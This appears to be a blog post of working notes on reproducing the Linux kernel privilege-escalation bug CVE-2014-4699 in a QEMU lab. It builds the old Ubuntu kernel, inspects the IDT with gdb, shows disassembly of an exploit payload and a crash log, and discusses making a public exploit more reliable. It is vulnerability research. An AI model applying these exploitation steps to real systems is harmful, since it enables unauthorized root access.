---
layout: post
comments: true
title: "Resurrect an old vulnerability: CVE-2014-4699"
tags: [CVE, linux, gdb, kernel]
---

All starts with the ``SYSRET`` instruction and the way is handled by the OS,
explained more in detail [here](https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/),

    It has to do with a subtle difference in the way in which Intel processors
    implement error handling in their version of AMD’s SYSRET instruction. The
    SYSRET instruction is part of the x86-64 standard defined by AMD. If an
    operating system is written according to AMD’s spec, but run on Intel hardware,
    the difference in implementation can be exploited by an attacker to write to
    arbitrary addresses in the operating system’s memory.

in our particular case, i.e. **CVE-2014-4699**, we have the linux kernel,
specifically the ubuntu version ``3.2.0-23-generic #36``, the original writeup
by Vitaly Nikolenko can be found [here](http://cyseclabs.com/page?n=21072014).

https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/

The quick and dirty way to describe the vulnerability is that simply allow to
indicate a stack pointer pointing in kernel space that allows to write into it.
We overwrite the ``IDT`` entry for the **page fault** exception that when raised
will make the code land in user space, in a buffer controlled by the attacker.

http://blog.scoutapp.com/articles/2015/04/10/understanding-page-faults-and-memory-swap-in-outs-when-should-you-worry

What we are interested here is replicate the environment in order to test
an [exploit](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-4699)

## Install the kernel


This is an Ubuntu's kernel so we cannot use [snapshot.debian.org](http://snapshot.debian.org/)
to obtain the packages but we can use [archive.ubuntu.com](http://archive.ubuntu.com/ubuntu/pool/main/l/linux/)
and look for ``linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb``. Otherwise you can
google the package and found the [launchpad page](https://launchpad.net/ubuntu/precise/amd64/linux-image-3.2.0-23-generic/3.2.0-23.36)
from which a link to the [source code](https://launchpad.net/ubuntu/+source/linux/3.2.0-23.36) is available.

[kernel exploitation for dummies](http://uaf.io/exploitation/misc/2016/09/10/Kernel-Exploitation-for-Dummies.html)

https://help.ubuntu.com/community/Kernel/Compile

https://wiki.ubuntu.com/Kernel/BuildYourOwnKernel

https://medium.com/square-corner-blog/a-short-guide-to-kernel-debugging-e6fdbe7bfcdf

https://kernelnewbies.org/FAQ/asmlinkage

Out of the box obviously doesn't work:

```
$ wget https://launchpad.net/ubuntu/+archive/primary/+files/linux_3.2.0.orig.tar.gz
$ tar zxvf linux_3.2.0.orig.tar.gz
$ wget https://launchpad.net/ubuntu/+archive/primary/+files/linux_3.2.0-23.36.diff.gz
$ cd linux-3.2
$ patch -p1 < /hack/linux_3.2.0-23.36.diff
$ fakeroot debian/rules binary-generic
... A LOT OF STUFF
    cc1: error: code model kernel does not support PIC mode
... ANOTHER TSUNAMI OF SHIT
```

because a kernel intended to build in 2012 doesn't compile in a Debian9 in 2018; lucky us
exists Docker

```
$ docker run -it -v $(pwd):/kernel ubuntu:12.04 /bin/bash
# apt-get update
# apt-get build-dep linux-image-3.2.0-23-generic
# chmod +x debian/rules
# chmod a+x debian/scripts/misc/*
# DEB_BUILD_OPTIONS=parallel=8 AUTOBUILD=1 NOEXTRAS=1 debian/rules binary-generic
 ...
dpkg-deb: building package `linux-image-3.2.0-23-generic' in `../linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb'
 ...
# ls ./debian/build/build-generic/
Makefile        System.map  block   drivers   fs       init  kernel  mm               modules.order  scripts   sound   ubuntu        usr   vmlinux
Module.symvers  arch        crypto  firmware  include  ipc   lib     modules.builtin  net            security  source  ubuntu-build  virt  vmlinux.o
# ls ./debian/linux-image-3.2.0-23-generic/boot
System.map-3.2.0-23-generic  abi-3.2.0-23-generic  config-3.2.0-23-generic  vmlinuz-3.2.0-23-generic
```

if you want to build a kernel with debugging symbols add ``skipdbg=false`` at the end of the target of the
``debian/rules`` command. The package ``pkg-create-dbgsym`` is needed.

```
# tree ./debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/ -L 2
./debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/
|-- boot
|   `-- vmlinux-3.2.0-23-generic
`-- lib
    `-- modules

3 directories, 1 file
```

## Exploring kernel source code

``ctags -R .`` helps a lot

``arch/x86/include/asm/desc_defs.h``

```
struct gate_struct {
	u16		offset_low;
	u16		segment;
	struct idt_bits	bits;
	u16		offset_middle;
#ifdef CONFIG_X86_64
	u32		offset_high;
	u32		reserved;
#endif
} __attribute__((packed));

typedef struct gate_struct gate_desc;
```

``arch/x86/kernel/idt.c``

```
gef➤  file /hack/linux-3.2/debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/boot/vmlinux-3.2.0-23-generic
gef➤  directory /hack/linux-3.2/arch/x86/include/asm/
gef➤  print general_protection 
$7 = {<text variable, no debug info>} 0xffffffff8165cba0 <general_protection>
gef➤  print idt_table[X86_TRAP_GP]
No symbol "X86_TRAP_GP" in current context.
gef➤  print idt_table[13]
$8 = {
  offset_low = 0xcba0, 
  segment = 0x10, 
  ist = 0x0, 
  zero0 = 0x0, 
  type = 0xe, 
  dpl = 0x0, 
  p = 0x1, 
  offset_middle = 0x8165, 
  offset_high = 0xffffffff, 
  zero1 = 0x0
}
gef➤  p *idt_table@256
$12 = { {
    offset_low = 0x69f0, 
    segment = 0x10, 
    ist = 0x0, 
    zero0 = 0x0, 
    type = 0xe, 
    dpl = 0x0, 
    p = 0x1, 
    offset_middle = 0x8166, 
    offset_high = 0xffffffff, 
    zero1 = 0x0
  }, {
 ...
  }, {
    offset_low = 0x68f0, 
    segment = 0x10, 
    ist = 0x0, 
    zero0 = 0x0, 
    type = 0xe, 
    dpl = 0x0, 
    p = 0x1, 
    offset_middle = 0x8166, 
    offset_high = 0xffffffff, 
    zero1 = 0x0
  }}
gef➤  print idt_table
$18 = 0xffffffff81dd7000
gef➤  print &idt_table[257]
$19 = (gate_desc *) 0xffffffff81dd8010 <static_command_line>
gef➤  dump memory /tmp/idt_table.bin 0xffffffff81dd7000 0xffffffff81dd8010
```

The page fault mechanism is implemented in ``asm/x86/kernel/traps.c``

```
/* Set of traps needed for early debugging. */
void __init early_trap_init(void)
{
	set_intr_gate_ist(1, &debug, DEBUG_STACK);
	/* int3 can be called from all */
	set_system_intr_gate_ist(3, &int3, DEBUG_STACK);
	set_intr_gate(14, &page_fault);
	load_idt(&idt_descr);
}
```

```
static inline void set_intr_gate(unsigned int n, void *addr)
{
	BUG_ON((unsigned)n > 0xFF);
	_set_gate(n, GATE_INTERRUPT, addr, 0, 0, __KERNEL_CS);
}

static inline void _set_gate(int gate, unsigned type, void *addr,
			     unsigned dpl, unsigned ist, unsigned seg)
{
	gate_desc s;

	pack_gate(&s, type, (unsigned long)addr, dpl, ist, seg);
	/*
	 * does not need to be atomic because it is only done once at
	 * setup time
	 */
	write_idt_entry(idt_table, gate, &s);
}

static inline void pack_gate(gate_desc *gate, unsigned type, unsigned long func,
			     unsigned dpl, unsigned ist, unsigned seg)
{
	gate->offset_low	= PTR_LOW(func);
	gate->segment		= __KERNEL_CS;
	gate->ist		= ist;
	gate->p			= 1;
	gate->dpl		= dpl;
	gate->zero0		= 0;
	gate->zero1		= 0;
	gate->type		= type;
	gate->offset_middle	= PTR_MIDDLE(func);
	gate->offset_high	= PTR_HIGH(func);
}


```

Before exploit

```
gef➤  print idt_table[14]
$13 = {
  offset_low = 0xcc00, 
  segment = 0x10, 
  ist = 0x0, 
  zero0 = 0x0, 
  type = 0xe, 
  dpl = 0x0, 
  p = 0x1, 
  offset_middle = 0x8165, 
  offset_high = 0xffffffff, 
  zero1 = 0x0
}
```

After the exploit

```
gef➤  print idt_table[14]
$15 = {
  offset_low = 0xcbd0, 
  segment = 0x10, 
  ist = 0x0, 
  zero0 = 0x0, 
  type = 0xe, 
  dpl = 0x0, 
  p = 0x1, 
  offset_middle = 0x8165, 
  offset_high = 0xffffffff, 
  zero1 = 0x0
}
```

```
gef➤  restore /tmp/idt_table.bin binary 0xffffffff81dd7000
Restoring binary file /tmp/idt_table.bin into memory (0xffffffff81dd7000 to 0xffffffff81dd8010)
```

```
$ xxd --include /tmp/idt_table.bin | head
unsigned char _tmp_idt_table_bin[] = {
  0xf0, 0x69, 0x10, 0x00, 0x00, 0x8e, 0x66, 0x81, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x80, 0xca, 0x10, 0x00, 0x04, 0x8e, 0x65, 0x81,
 ...
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x40, 0x89, 0xfa, 0x3f, 0x00, 0x88, 0xff, 0xff
};
unsigned int _tmp_idt_table_bin_len = 4112;
```

https://0xax.gitbooks.io/linux-insides/content/KernelStructures/linux-kernelstructure-1.html


https://github.com/torvalds/linux/blob/master/Documentation/kbuild/modules.txt

## Improve the exploit

Following the methodology used by fail0verflow to develop a reliable exploit
for [FreeBSD](https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/)
the missing piece is recreating the ``IDT`` messed up by the existing exploit.

https://rlworkman.net/system.map/
https://www.elinux.org/Debugging_The_Linux_Kernel_Using_Gdb
https://01.org/linuxgraphics/gfx-docs/drm/dev-tools/gdb-kernel-debugging.html
https://www.kernel.org/doc/html/v4.11/dev-tools/gdb-kernel-debugging.html
https://stackoverflow.com/questions/26271901/is-it-possible-to-use-gdb-and-qemu-to-debug-linux-user-space-programs-and-kernel
https://github.com/torvalds/linux/blob/master/scripts/gdb/vmlinux-gdb.py
https://kernelnewbies.org/FAQ/BUG


http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/


```
$ od -t x1 -A d linux_image/boot/vmlinuz-3.2.0-23-generic | grep "1f 8b 08"
0018016 48 8d 83 50 37 4b 00 ff e0 1f 8b 08 00 00 00 00
$ dd if=linux_image/boot/vmlinuz-3.2.0-23-generic bs=1 skip=0018025 | zcat > vmlinux
4947815+0 record dentro
4947815+0 record fuori
4947815 bytes (4,9 MB, 4,7 MiB) copied, 3,25252 s, 1,5 MB/s

gzip: stdin: decompression OK, trailing garbage ignored
$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=6171fe7a98b41dfbe7ed9afa8b1c033f3acaff9c, stripped
```

```
$ gcc -g -Wall cve-2014-4699.c -o cve-2014-4699 -static
```

``-static`` because I'm using a ``buildroot`` generated machine without
the library of an Ubuntu installation.

```
gef➤  x/30i tmp - 15
   0x8ffffbf1:  nop
   0x8ffffbf2:  nop
   0x8ffffbf3:  swapgs               <--- tmp - 13
   0x8ffffbf6:  call   0x8ffffc00
   0x8ffffbfb:  swapgs 
   0x8ffffbfe:  iretq                <--- end 2nd memcpy()
   0x8ffffc00:  push   rbp           <--- start payload
   0x8ffffc01:  mov    rbp,rsp
   0x8ffffc04:  sub    rsp,0x20
   0x8ffffc08:  mov    QWORD PTR [rbp-0x8],0xffffffff81dd70e8
   0x8ffffc10:  mov    rax,QWORD PTR [rbp-0x8]
   0x8ffffc14:  mov    DWORD PTR [rax],0xffffffff
   0x8ffffc1a:  mov    QWORD PTR [rbp-0x10],0xffffffff81091630
   0x8ffffc22:  mov    QWORD PTR [rbp-0x18],0xffffffff810918e0
   0x8ffffc2a:  mov    rax,QWORD PTR [rbp-0x18]
   0x8ffffc2e:  mov    edi,0x0
   0x8ffffc33:  call   rax
   0x8ffffc35:  mov    rdx,rax
   0x8ffffc38:  mov    rax,QWORD PTR [rbp-0x10]
   0x8ffffc3c:  mov    rdi,rdx
   0x8ffffc3f:  call   rax
   0x8ffffc41:  nop
   0x8ffffc42:  leave  
   0x8ffffc43:  ret
```

```
$ qemu-system-x86_64 \
    -hda output/images/rootfs.ext2 \
    -m 1024 \
    -enable-kvm \
    -kernel linux_image/boot/vmlinuz-3.2.0-23-generic \
    -append 'root=/dev/sda \
    console=tty0 console=ttyS0 rw' \
    -net nic,model=virtio -net user,hostfwd=tcp::2222-:22 \
    -S -s  \
    -serial stdio
```
You can copy the exploit via ``ssh``

```
$ scp -o StrictHostKeyChecking=no -P 2222 cve-2014-4699 sh root@localhost:/tmp
```

```
 ...
[    7.721360] double fault: 0000 [#1] SMP 
[    7.721360] CPU 0 
[    7.721360] Modules linked in:
[    7.721360] 
[    7.721360] Pid: 121, comm: cve-2014-4699 Not tainted 3.2.0-23-generic #36-Ubuntu QEMU Standard PC (i440FX + PIIX, 1996)
[    7.721360] RIP: 0010:[<000000008ffffbfe>]  [<000000008ffffbfe>] 0x8ffffbfd
[    7.721360] RSP: 0018:ffffffff81dd7010  EFLAGS: 00010046
[    7.721360] RAX: 0000000000000000 RBX: 0000000000000001 RCX: 00000000ffffffff
[    7.721360] RDX: ffffffff81c31b00 RSI: ffffffff81091300 RDI: 0000000000000086
[    7.721360] RBP: ffffffff81dd7068 R08: 0000000000000000 R09: ffff88003ce4c0c0
[    7.721360] R10: 81668e0000106b10 R11: 0000000000000246 R12: ffffffff81dd7078
[    7.721360] R13: 0000000000000000 R14: 81668e0200106a90 R15: 00000000ffffffff
[    7.721360] FS:  0000000001433880(0063) GS:ffff88003fc00000(0000) knlGS:0000000000000000
[    7.721360] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[    7.721360] CR2: 000000000000c500 CR3: 000000003cfe8000 CR4: 00000000000006f0
[    7.721360] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[    7.721360] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[    7.721360] Process cve-2014-4699 (pid: 121, threadinfo ffff88003cff4000, task ffff88003cf9c4d0)
[    7.721360] Stack:
[    7.721360]  0000000000000000 ffffffff8165d06f 0000000000000010 0000000000010046
[    7.721360]  ffffffff81dd7048 0000000000000018 8166ee0000106a10 00000000ffffffff
[    7.721360]  0000000000000001 81668e0000106ac0 00000000ffffffff 00000000ffffffff
[    7.721360] Call Trace:
[    7.721360] Code:  Bad RIP value.
[    7.721360] RIP  [<000000008ffffbfe>] 0x8ffffbfd
[    7.721360]  RSP <ffffffff81dd7010>
[    7.721360] ---[ end trace c1b610693687e90e ]---
```

This is a [double fault](https://en.wikipedia.org/wiki/Double_fault)

![idt trashing]({{ site.baseurl }}/public/images/idt-diff.png)

BTW you can use [eudyptula-boot](https://vincent.bernat.im/en/blog/2014-eudyptula-boot) to
create a replicable kernel environment.

I want to create the shellcode from a module

```
# dpkg -i ../linux-headers-3.2.0-23-generic_3.2.0-23.36_amd64.deb
# make -C /lib/modules/3.2.0-23-generic/build M=$PWD
make: Entering directory `/usr/src/linux-headers-3.2.0-23-generic'
  CC [M]  /modules/cve-exploit.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /modules/cve-exploit.mod.o
  LD [M]  /modules/cve-exploit.ko
make: Leaving directory `/usr/src/linux-headers-3.2.0-23-generic'
```
